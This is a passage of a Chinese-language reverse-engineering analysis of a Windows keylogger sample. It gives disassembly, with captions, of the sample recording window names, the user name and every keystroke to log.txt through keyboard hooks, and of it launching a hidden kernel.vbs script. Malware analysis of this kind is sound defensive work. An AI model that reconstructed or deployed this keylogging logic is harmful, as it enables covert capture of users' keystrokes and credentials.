
写入用户所作的操作至`log.txt`

```
0040131E   .  8DB5 C0FEFFFF lea     esi, dword ptr ss:[ebp-1>
00401324   .  56             push    esi
00401325   .  8DB5 00FFFFFF lea     esi, dword ptr ss:[ebp-1>
0040132B   .  56             push    esi
0040132C   .  E8 19000000   call    Keylog.0040134A          ;  PUSH ASCII "[  W1nd0w n4m3:%s  ]\n"
00401331   .  0D 0A 5B 20 2>ascii   "[  W1nd0w n4m3"
00401341   .  3A 25 73 20 2>ascii   ":%s  ]\n"
0040134A   >  FF35 AE384000 push    dword ptr ds:[4038AE]    ; |stream = NULL
00401350   .  FF15 68204000 call    near dword ptr ds:[<&msv>; \fprintf
00401356   .  83C4 0C        add     esp, 0C
00401359   .  C705 B6384000>mov     dword ptr ds:[4038B6], 8>
00401363   .  68 B6384000   push    Keylog.004038B6
00401368   .  68 7C384000   push    Keylog.0040387C
0040136D   .  6A 01         push    1
0040136F   .  E8 16020000   call    <jmp.&kernel32.GetComput>
00401374   .  C705 B6384000>mov     dword ptr ds:[4038B6], 2>
0040137E   .  68 B6384000   push    Keylog.004038B6
00401383   .  68 DA384000   push    Keylog.004038DA
00401388   .  6A 00         push    0
0040138A   .  E8 FB010000   call    <jmp.&kernel32.GetComput>
0040138F   .  C705 B6384000>mov     dword ptr ds:[4038B6], 2>
```

获取用户名

```
00401399   .  68 B6384000   push    Keylog.004038B6          ; /pBufCount = Keylog.004038B6
0040139E   .  68 BA384000   push    Keylog.004038BA          ; |Buffer = Keylog.004038BA
004013A3   .  E8 2A020000   call    <jmp.&advapi32.GetUserNa>; \GetUserNameA
```

以`[ us3r l0gg3d: %s]`的格式写入用户名至`log.txt`

```
004013A8   .  8D35 BA384000 lea     esi, dword ptr ds:[4038B>
004013AE   .  56             push    esi
004013AF   .  E8 15000000   call    Keylog.004013C9          ;  PUSH ASCII "[ us3r l0gg3d: %s]\n"
004013B4   .  5B 20 75 73 3>ascii   "[ us3r l0gg3d: %"
004013C4   .  73 5D 0D 0A 0>ascii   "s]\n"
004013C9   >  FF35 AE384000 push    dword ptr ds:[4038AE]    ; |stream = NULL
004013CF   .  FF15 68204000 call    near dword ptr ds:[<&msv>; \fprintf
004013D5   .  83C4 0C        add     esp, 0C
004013D8   .  FF35 AE384000 push    dword ptr ds:[4038AE]    ; /stream = NULL
004013DE   .  FF15 60204000 call    near dword ptr ds:[<&msv>; \fflush
004013E4   .  83C4 04        add     esp, 4
004013E7   >  8B75 10        mov     esi, dword ptr ss:[ebp+1>
004013EA   .  AD             lods    dword ptr ds:[esi]
004013EB   .  3C A0         cmp     al, 0A0
004013ED   .  0F84 C0000000 je      Keylog.004014B3
004013F3   .  3C A1         cmp     al, 0A1
004013F5   .  0F84 B8000000 je      Keylog.004014B3
004013FB   .  3C 14         cmp     al, 14
004013FD   .  0F84 B0000000 je      Keylog.004014B3
00401403   .  3C 1B         cmp     al, 1B
00401405   .  74 60         je      short Keylog.00401467
00401407   .  3C 08         cmp     al, 8
00401409   .  74 5C        je      short Keylog.00401467
0040140B   .  3C 09         cmp     al, 9
0040140D   .  74 58        je      short Keylog.00401467
0040140F   .  8DBD A0FEFFFF lea     edi, dword ptr ss:[ebp-1>
```

获取所有虚拟键的状态

```
00401415   .  6A 08         push    8
00401417   .  59           pop     ecx
00401418   .  33C0        xor     eax, eax
0040141A   .  F3:AB       rep     stos dword ptr es:[edi]
0040141C   .  8D9D 00FFFFFF lea     ebx, dword ptr ss:[ebp-1>
00401422   .  53           push    ebx                   ; /pState
00401423   .  E8 14010000 call    <jmp.&user32.GetKeyboard>; \GetKeyboardState
00401428   .  68 A0000000 push    0A0                   ; /Key = VK_LSHIFT
0040142D   .  E8 04010000 call    <jmp.&user32.GetKeyState>; \GetKeyState
00401432   .  96           xchg    eax, esi
00401433   .  68 A1000000 push    0A1                   ; /Key = VK_RSHIFT
00401438   .  E8 F9000000 call    <jmp.&user32.GetKeyState>; \GetKeyState
0040143D   .  0BC6        or      eax, esi
0040143F   .  8843 10     mov     byte ptr ds:[ebx+10], al
00401442   .  6A 14       push    14                    ; /Key = VK_CAPITAL
00401444   .  E8 ED000000 call    <jmp.&user32.GetKeyState>; \GetKeyState
00401449   .  8843 14     mov     byte ptr ds:[ebx+14], al
0040144C   .  8B75 10     mov     esi, dword ptr ss:[ebp+1>
0040144F   .  8DBD A0FEFFFF lea     edi, dword ptr ss:[ebp-1>
00401455   .  6A 00       push    0                     ; /MenuActive = 0
00401457   .  57           push    edi                   ; |pTranslated
00401458   .  53           push    ebx                   ; |pKeyState
00401459   .  AD           lods    dword ptr ds:[esi]      ; |
0040145A   .  92           xchg    eax, edx              ; |
0040145B   .  AD           lods    dword ptr ds:[esi]      ; |
0040145C   .  50           push    eax                   ; |ScanCode
0040145D   .  52           push    edx                   ; |Key
0040145E   .  E8 F7000000 call    <jmp.&user32.ToAscii>    ; \ToAscii
00401463   .  85C0        test    eax, eax
00401465   .  75 2B       jnz     short Keylog.00401492
```

获取按下的键名

```
00401467   >  8B75 10     mov     esi, dword ptr ss:[ebp+1>
0040146A   .  AD           lods    dword ptr ds:[esi]
0040146B   .  AD           lods    dword ptr ds:[esi]
0040146C   .  C1E0 10     shl     eax, 10
0040146F   .  91           xchg    eax, ecx
00401470   .  AD           lods    dword ptr ds:[esi]
00401471   .  C1E0 18     shl     eax, 18
00401474   .  0BC8        or      ecx, eax
00401476   .  6A 20       push    20                    ; /Count = 20 (32.)
00401478   .  8DBD A0FEFFFF lea     edi, dword ptr ss:[ebp-1>; |
0040147E   .  57           push    edi                   ; |Buffer
0040147F   .  51           push    ecx                   ; |lParam
00401480   .  E8 AB000000 call    <jmp.&user32.GetKeyNameT>; \GetKeyNameTextA
```

输出键名至`log.txt`

```
00401485   .  57           push    edi
00401486   .  E8 05000000 call    Keylog.00401490         ;  PUSH ASCII "[%s]"
0040148B   .  5B 25 73 5D 0>ascii   "[%s]",0
00401490   >  EB 12       jmp     short Keylog.004014A4
00401492   >  57           push    edi
00401493   .  E8 03000000 call    Keylog.0040149B
00401498   .  25 73 00     ascii   "%s",0
0040149B   .  803F 0D     cmp     byte ptr ds:[edi], 0D
0040149E   .  75 04       jnz     short Keylog.004014A4
004014A0   .  C647 01 0A  mov     byte ptr ds:[edi+1], 0A
004014A4   >  FF35 AE384000 push    dword ptr ds:[4038AE]    ; |stream = NULL
004014AA   .  FF15 68204000 call    near dword ptr ds:[<&msv>; \fprintf
004014B0   .  83C4 04     add     esp, 4    堆栈平衡
```

调用下一个钩子

```
004014B3   >  FF75 10     push    dword ptr ss:[ebp+10]    ; /lParam
004014B6   .  FF75 0C     push    dword ptr ss:[ebp+C]     ; |wParam
004014B9   .  FF75 08     push    dword ptr ss:[ebp+8]     ; |HookCode
004014BC   .  FF35 B2384000 push    dword ptr ds:[4038B2]    ; |hHook = NULL
004014C2   .  E8 57000000 call    <jmp.&user32.CallNextHoo>; \CallNextHookEx
004014C7   .  8305 643B4000>add     dword ptr ds:[403B64], 1
004014CE   .  813D 643B4000>cmp     dword ptr ds:[403B64], 0>
004014D8   .  7E 40       jle     short Keylog.0040151A
004014DA   .  C705 643B4000>mov     dword ptr ds:[403B64], 0
004014E4   .  FF35 AE384000 push    dword ptr ds:[4038AE]    ; /stream = NULL
004014EA   .  FF15 6C204000 call    near dword ptr ds:[<&msv>; \fclose
004014F0   .  83C4 04     add     esp, 4    堆栈平衡
```

以隐藏方式执行`kernel.vbs`脚本

```
004014F3   .  6A 00         push    0                     ; /ShowState = SW_HIDE
004014F5   .  68 A3324000   push    Keylog.004032A3         ; |CmdLine = "C:\WINDOWS\system32\kernel.vbs"
```
